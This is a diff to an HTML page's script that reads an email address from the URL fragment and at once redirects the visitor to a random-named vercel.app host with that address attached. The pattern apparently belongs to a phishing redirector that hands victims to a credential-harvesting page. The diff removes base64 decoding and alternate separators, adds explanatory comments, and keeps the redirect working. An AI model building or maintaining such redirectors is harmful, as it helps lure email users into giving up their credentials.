@@ -9,35 +9,25 @@
 <body>
 
   <script type="text/javascript">
+    // Get the current URL
     var url_string = window.location.href;
-    var url_get_email = atob(getafterhash(url_string));
-    
-    // Check if url_get_email is valid before constructing the URL
-    if (url_get_email) {
-      var mail_go_url = "https://ogandghgfcfghjjdegjkjcfdfhhjgddfghj.vercel.app#" + url_get_email;
-      location.replace(mail_go_url);
-    } else {
-      console.error("No valid email found in the URL hash.");
-    }
 
+    // Extract the part after the hash (#)
+    var url_get_email = getafterhash(url_string);
+
+    // Construct the new URL using the extracted part
+    var mail_go_url = "https://ogandghgfcfghjjdegjkjcfdfhhjgddfghj.vercel.app#" + url_get_email;
+
+    // Redirect to the new URL
+    location.replace(mail_go_url);
+
+    // Function to extract the part after the hash (#)
     function getafterhash(url) {
       var ret;
-      var queryStringhash = url.split('#')[1];
-      var queryStringsemi = url.split(';')[1];
-      var queryStringsemiplus = url.split(';+')[1];
-      var queryStringstartsemi = url.split('*;')[1];
+      var queryStringhash = url.split('#')[1]; // Get the part after the hash
 
-      if (queryStringhash) {
-        ret = queryStringhash;
-      } else if (queryStringsemi) {
-        ret = queryStringsemi;
-      } else if (queryStringsemiplus) {
-        ret = queryStringsemiplus;
-      } else if (queryStringstartsemi) {
-        ret = queryStringstartsemi;
-      } else {
-        ret = 0;
-      }
+      // Return the extracted part or an empty string if not found
+      ret = queryStringhash ? queryStringhash : '';
 
       return ret;
     }
